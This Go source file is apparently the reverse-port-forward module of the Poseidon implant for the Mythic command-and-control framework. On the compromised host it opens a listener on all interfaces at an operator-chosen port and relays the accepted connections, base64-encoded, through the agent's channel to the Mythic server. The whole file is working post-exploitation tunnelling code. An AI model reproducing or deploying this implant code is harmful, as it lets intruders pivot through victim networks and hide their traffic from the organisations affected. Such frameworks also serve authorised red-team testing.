package rpfwd

import (
	// Standard
	"bufio"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
	"math"
	"math/rand"
	"net"
	"time"

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type rpfwdTracker struct {
	Channel    chan structs.SocksMsg
	Connection net.Conn
	Port       uint32
}
type Args struct {
	Action string `json:"action"`
	Port   uint32 `json:"port"`
}

var channelMap = make(map[uint32]rpfwdTracker)

type addToMap struct {
	ChannelID  uint32
	Port       uint32
	Connection net.Conn
	NewChannel chan structs.SocksMsg
}

var addToMapChan = make(chan addToMap)
var removeFromMapChan = make(chan uint32, 100)
var closeAllChannelsChan = make(chan uint32)

// var sendToMapChan = make(chan structs.SocksMsg)
var startedGoRoutines = false
var listenMap = make(map[uint32]*net.Listener)
var listenMessageChan = make(chan structs.Task)

func Run(task structs.Task) {
	if !startedGoRoutines {
		go handleMutexMapModifications()
		go handleListenMapModifications()
		startedGoRoutines = true
	}
	listenMessageChan <- task
}
func handleMutexMapModifications() {
	for {
		select {
		case closePort := <-closeAllChannelsChan:
			// close all the connections for a specific port
			for key, _ := range channelMap {
				if channelMap[key].Port == closePort {
					close(channelMap[key].Channel)
					channelMap[key].Connection.Close()
					delete(channelMap, key)
				}
			}
		case msg := <-addToMapChan:
			channelMap[msg.ChannelID] = rpfwdTracker{
				Channel:    msg.NewChannel,
				Connection: msg.Connection,
			}
		case msg := <-removeFromMapChan:
			if _, ok := channelMap[msg]; ok {
				close(channelMap[msg].Channel)
				channelMap[msg].Connection.Close()
				delete(channelMap, msg)
				//fmt.Printf("Removed channel (%d) from map, now length %d\n", msg, len(channelMap.m))
			}
		case msg := <-responses.FromMythicRpfwdChannel:
			//fmt.Printf("got message FromMythicRpfwdChannel: %d\n", msg.ServerId)
			if _, ok := channelMap[msg.ServerId]; ok {
				select {
				case channelMap[msg.ServerId].Channel <- msg:
				case <-time.After(1 * time.Second):
					//fmt.Printf("dropping data because channel is full")
				}
			} else {
				//fmt.Printf("Channel id, %d, unknown\n", msg.ServerId)
			}
		}
	}
}
func handleListenMapModifications() {
	for {
		select {
		case task := <-listenMessageChan:
			args := Args{}
			err := json.Unmarshal([]byte(task.Params), &args)
			if err != nil {
				msg := task.NewResponse()
				msg.SetError(err.Error())
				task.Job.SendResponses <- msg
				return
			}
			msg := task.NewResponse()
			closeAllChannelsChan <- args.Port
			if args.Action == "start" {
				if _, ok := listenMap[args.Port]; ok {
					// want to start on the same port that's already running, try closing the port first
					(*listenMap[args.Port]).Close()
				}
				addr := fmt.Sprintf("0.0.0.0:%d", args.Port)
				if l, err := net.Listen("tcp4", addr); err != nil {
					msg = task.NewResponse()
					msg.SetError(err.Error())
					task.Job.SendResponses <- msg
					continue
				} else {
					listenMap[args.Port] = &l
					go handleConnections(task, &l, args.Port)
				}
				msg.UserOutput = fmt.Sprintf("reverse port forward started on port: %d\n", args.Port)
				msg.Completed = true
			} else {
				if _, ok := listenMap[args.Port]; ok {
					if err = (*listenMap[args.Port]).Close(); err != nil {
						msg = task.NewResponse()
						msg.SetError(err.Error())
						task.Job.SendResponses <- msg
						continue
					}
					msg.UserOutput = fmt.Sprintf("reverse port forward stopped on port: %d\n", args.Port)
					msg.Completed = true
				} else {
					msg.UserOutput = fmt.Sprintf("reverse port forward wasn't listening on port: %d\n", args.Port)
					msg.Completed = true
				}
			}
			task.Job.SendResponses <- msg
		}
	}
}
func handleConnections(task structs.Task, listener *net.Listener, port uint32) {
	for {
		conn, err := (*listener).Accept()
		if err != nil {
			// fail to get a new connection, report it and stop listening
			msg := task.NewResponse()
			msg.SetError(err.Error())
			task.Job.SendResponses <- msg
			return
		}
		recvChan := make(chan structs.SocksMsg, 200)
		newChannelID := uint32(rand.Intn(math.MaxInt32))
		addToMapChan <- addToMap{
			ChannelID:  newChannelID,
			Connection: conn,
			NewChannel: recvChan,
			Port:       port,
		}
		go readFromProxy(conn, responses.InterceptToMythicRpfwdChannel, newChannelID, port)
		go writeToProxy(recvChan, conn, newChannelID, responses.InterceptToMythicRpfwdChannel, port)
	}

}
func readFromProxy(conn net.Conn, toMythicRpfwdChannel chan structs.SocksMsg, channelId uint32, port uint32) {
	for {
		bufIn := make([]byte, 4096)
		// Read the incoming connection into the buffer.
		//conn.SetReadDeadline(time.Now().Add(5 * time.Second))
		//fmt.Printf("channel (%d) waiting to read from proxy address\n", channelId)
		totalRead, err := conn.Read(bufIn)
		//fmt.Printf("channel (%d) totalRead from proxy: %d\n", channelId, totalRead)

		if err != nil {
			//fmt.Println("Error reading from remote proxy: ", err.Error())
			msg := structs.SocksMsg{
				ServerId: channelId,
				Data:     "",
				Exit:     true,
				Port:     port,
			}
			toMythicRpfwdChannel <- msg
			//fmt.Printf("Telling mythic locally to exit channel %d from bad proxy read, exit going back to mythic too\n", channelId)
			//fmt.Printf("closing from bad proxy read: %v, %v\n", err.Error(), channelId)
			removeFromMapChan <- channelId
			return
		}
		//fmt.Printf("Channel (%d) Got %d bytes from proxy\n", channelId, totalRead)
		if totalRead > 0 {
			msg := structs.SocksMsg{
				ServerId: channelId,
				Data:     base64.StdEncoding.EncodeToString(bufIn[:totalRead]),
				Exit:     false,
				Port:     port,
			}
			toMythicRpfwdChannel <- msg
		}
	}
}
func writeToProxy(recvChan chan structs.SocksMsg, conn net.Conn, channelId uint32, toMythicRpfwdChannel chan structs.SocksMsg, port uint32) {
	w := bufio.NewWriter(conn)
	for bufOut := range recvChan {
		// Send a response back to person contacting us.
		//fmt.Printf("writeToProxy wants to send %d bytes\n", len(bufOut.Data))
		if bufOut.Exit {
			// got a message from mythic that says to exit
			//fmt.Printf("channel (%d) got exit message from Mythic\n", channelId)
			w.Flush()
			//fmt.Printf("Telling mythic locally to exit channel %d, exit going back to mythic too\n", channelId)
			removeFromMapChan <- channelId
			return
		}
		data, err := base64.StdEncoding.DecodeString(bufOut.Data)
		if err != nil {
			//fmt.Printf("Bad base64 data received\n")
			w.Flush()
			msg := structs.SocksMsg{
				ServerId: channelId,
				Data:     "",
				Exit:     true,
				Port:     port,
			}
			toMythicRpfwdChannel <- msg
			//fmt.Printf("Telling mythic locally to exit channel %d, bad base64 data, exit going back to mythic too\n", channelId)
			removeFromMapChan <- channelId
			return
		}
		_, err = w.Write(data)
		if err != nil {
			//fmt.Println("channel (%d) Error writing to proxy: ", channelId, err.Error())
			msg := structs.SocksMsg{
				ServerId: channelId,
				Data:     "",
				Exit:     true,
				Port:     port,
			}
			toMythicRpfwdChannel <- msg
			//fmt.Printf("Telling mythic locally to exit channel %d bad write to proxy, exit going back to mythic too\n", channelId)
			//fmt.Printf("told mythic to exit channel %d through fromMythicSocksChannel <- msg\n", channelId)
			//fmt.Printf("channel (%d) closing from bad proxy write\n", channelId)
			removeFromMapChan <- channelId
			return
		}
		w.Flush()
		//fmt.Printf("total written to proxy: %d\n", totalWritten)
	}
	w.Flush()
	//fmt.Printf("channel (%d) proxy connection for writing closed\n", channelId)
	msg := structs.SocksMsg{
		ServerId: channelId,
		Data:     "",
		Exit:     true,
		Port:     port,
	}
	toMythicRpfwdChannel <- msg
	//fmt.Printf("Telling mythic locally to exit channel %d proxy writing go routine exiting, exit going back to mythic too\n", channelId)
	removeFromMapChan <- channelId
	return
}
